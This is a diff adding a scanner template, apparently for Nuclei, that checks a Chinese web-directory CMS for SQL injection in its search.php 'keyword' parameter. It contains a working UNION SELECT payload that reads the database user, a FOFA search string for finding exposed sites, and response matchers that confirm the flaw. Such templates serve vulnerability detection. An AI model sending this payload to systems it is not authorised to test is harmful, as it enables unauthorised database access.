@@ -1,0 +1,27 @@
+id: lanren-navigation-sqli-search
+
+info:
+  name: 懒人网址导航系统Search接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "./templates/antidote/css/style.css"
+      懒人网址导航系统在Search接口处存在SQL注入漏洞，攻击者可通过构造恶意SQL查询操控数据库，导致数据完整性受损或服务中断。
+  tags: 懒人网址导航系统
+
+http:
+- raw:
+  - |
+    GET /search.php?keyword=' UNION ALL SELECT CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Bypass HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'localhost'
